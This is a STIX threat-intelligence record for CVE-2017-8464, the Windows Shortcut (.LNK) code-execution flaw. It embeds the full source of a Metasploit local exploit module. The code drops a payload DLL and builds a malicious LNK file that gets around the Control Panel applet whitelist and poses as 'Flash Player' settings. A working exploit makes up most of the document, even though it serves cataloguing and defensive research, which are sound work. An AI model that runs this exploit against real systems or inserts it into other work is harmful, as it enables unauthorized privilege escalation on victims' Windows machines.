{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ff11b538-639f-4da5-a0e4-09f8eafb9ce1",
    "created": "2024-08-14T16:48:55.494787Z",
    "modified": "2024-08-14T16:48:55.49479Z",
    "name": "LNK Code Execution Vulnerability",
    "description": " This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK) that contain a dynamic icon, loaded from a malicious DLL. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2017_8464_lnk_lpe.rb",
            "external_id": "cve_2017_8464_lnk_lpe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-8464"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464"
        },
        {
            "source_name": "reference",
            "url": "http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm"
        },
        {
            "source_name": "reference",
            "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n\n  attr_accessor :exploit_dll_name\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'LNK Code Execution Vulnerability',\n        'Description' => %q{\n          This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK)\n          that contain a dynamic icon, loaded from a malicious DLL.\n\n          This vulnerability is a variant of MS15-020 (CVE-2015-0096). The created LNK file is\n          similar except an additional SpecialFolderDataBlock is included. The folder ID set\n          in this SpecialFolderDataBlock is set to the Control Panel. This is enough to bypass\n          the CPL whitelist. This bypass can be used to trick Windows into loading an arbitrary\n          DLL file.\n\n          The PATH option must be an absolute path to a writeable directory which is indexed for\n          searching. If no PATH is specified, the module defaults to %USERPROFILE%.\n        },\n        'Author' => [\n          'Uncredited', # vulnerability discovery\n          'Yorick Koster',   # msf module\n          'Spencer McIntyre' # msf module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2017-8464'],\n          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464'],\n          ['URL', 'http://www.vxjump.net/files/vuln_analysis/cve-2017-8464.txt'], # writeup\n          ['URL', 'https://msdn.microsoft.com/en-us/library/dd871305.aspx'], # [MS-SHLLINK]: Shell Link (.LNK) Binary File Format\n          ['URL', 'http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm'],\n          ['URL', 'https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf']\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'process',\n          'FileDropperDelay' => 15,\n          'WfsDelay' => 30\n        },\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Payload' => {\n          'Space' => 2048\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ],\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ]\n        ],\n        'DefaultTarget' => 0, # Default target is Automatic\n        'DisclosureDate' => '2017-06-13',\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_RESTARTS, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, ],\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        },\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILENAME', [false, 'The LNK file']),\n        OptString.new('DLLNAME', [false, 'The DLL file containing the payload']),\n        OptString.new('PATH', [false, 'An explicit path to where the files should be written to'])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('LnkComment', [true, 'The comment to use in the generated LNK file', 'Manage Flash Player Settings']),\n        OptString.new('LnkDisplayName', [true, 'The display name to use in the generated LNK file', 'Flash Player'])\n      ]\n    )\n  end\n\n  def check\n    if session.sys.process['SearchIndexer.exe']\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_name(option, default_ext)\n    name = datastore[option].to_s.strip\n    name = \"#{rand_text_alpha(16)}.#{default_ext}\" if name.blank?\n    name\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if session.platform != 'windows'\n      fail_with(Failure::NoTarget, 'This exploit requires a native Windows meterpreter session')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported, please get an x64 session')\n    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86\n      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2017-8464')\n    arch = target['Arch'] == ARCH_ANY ? payload.arch.first : target['Arch']\n    datastore['EXE::Path'] = path\n    datastore['EXE::Template'] = ::File.join(path, \"template_#{arch}_windows.dll\")\n\n    path = datastore['PATH'] || session.sys.config.getenv('USERPROFILE')\n    path.chomp!(\"\\\\\")\n\n    dll_path = \"#{path}\\\\#{get_name('DLLNAME', 'dll')}\"\n    write_file(dll_path, generate_payload_dll)\n\n    lnk_path = \"#{path}\\\\#{get_name('FILENAME', 'lnk')}\"\n    write_file(lnk_path, generate_link(dll_path))\n    register_files_for_cleanup(dll_path, lnk_path)\n  end\n\n  def file_rm(file)\n    if file_dropper_delete(session, file) && @dropped_files && file_dropper_deleted?(session, file, true)\n      @dropped_files.delete(file)\n    end\n  end\n\n  def generate_link(path)\n    vprint_status(\"Generating LNK file to load: #{path}\")\n    path += \"\\x00\" # Do not use << here\n    display_name = datastore['LnkDisplayName'].dup << \"\\x00\" # LNK Display Name\n    comment = datastore['LnkComment'].dup << \"\\x00\"\n\n    # Control Panel Applet ItemID with our DLL\n    cpl_applet = [\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00\n    ].pack('C*')\n    cpl_applet << [path.length].pack('v')\n    cpl_applet << [display_name.length].pack('v')\n    cpl_applet << path.unpack('C*').pack('v*')\n    cpl_applet << display_name.unpack('C*').pack('v*')\n    cpl_applet << comment.unpack('C*').pack('v*')\n\n    # LinkHeader\n    ret = [\n      0x4c, 0x00, 0x00, 0x00, # HeaderSize, must be 0x0000004C\n      0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, # LinkCLSID, must be 00021401-0000-0000-C000-000000000046\n      0x81, 0x00, 0x00, 0x00, # LinkFlags (HasLinkTargetIDList | IsUnicode)\n      0x00, 0x00, 0x00, 0x00, # FileAttributes\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # CreationTime\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # AccessTime\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # WriteTime\n      0x00, 0x00, 0x00, 0x00, # FileSize\n      0x00, 0x00, 0x00, 0x00, # IconIndex\n      0x00, 0x00, 0x00, 0x00, # ShowCommand\n      0x00, 0x00, # HotKey\n      0x00, 0x00, # Reserved1\n      0x00, 0x00, 0x00, 0x00, # Reserved2\n      0x00, 0x00, 0x00, 0x00  # Reserved3\n    ].pack('C*')\n\n    # IDList\n    idlist_data = ''\n    # ItemID = ItemIDSize (2 bytes) + Data (variable)\n    idlist_data << [0x12 + 2].pack('v')\n    idlist_data << [\n      # All Control Panel Items\n      0x1f, 0x80, 0x20, 0x20, 0xec, 0x21, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xdd, 0x08, 0x00, 0x2b, 0x30,\n      0x30, 0x9d\n    ].pack('C*')\n    # ItemID = ItemIDSize (2 bytes) + Data (variable)\n    idlist_data << [cpl_applet.length + 2].pack('v')\n    idlist_data << cpl_applet\n    idlist_data << [0x00].pack('v') # TerminalID\n\n    # LinkTargetIDList\n    ret << [idlist_data.length].pack('v') # IDListSize\n    ret << idlist_data\n\n    # ExtraData\n    # SpecialFolderDataBlock\n    ret << [\n      0x10, 0x00, 0x00, 0x00, # BlockSize\n      0x05, 0x00, 0x00, 0xA0, # BlockSignature 0xA0000005\n      0x03, 0x00, 0x00, 0x00, # SpecialFolderID (CSIDL_CONTROLS - My Computer\\Control Panel)\n      0x14, 0x00, 0x00, 0x00  # Offset in LinkTargetIDList\n    ].pack('C*')\n    # TerminalBlock\n    ret << [0x00, 0x00, 0x00, 0x00].pack('V')\n    ret\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-06-13",
    "x_mitre_platforms": [
        "win'"
    ]
}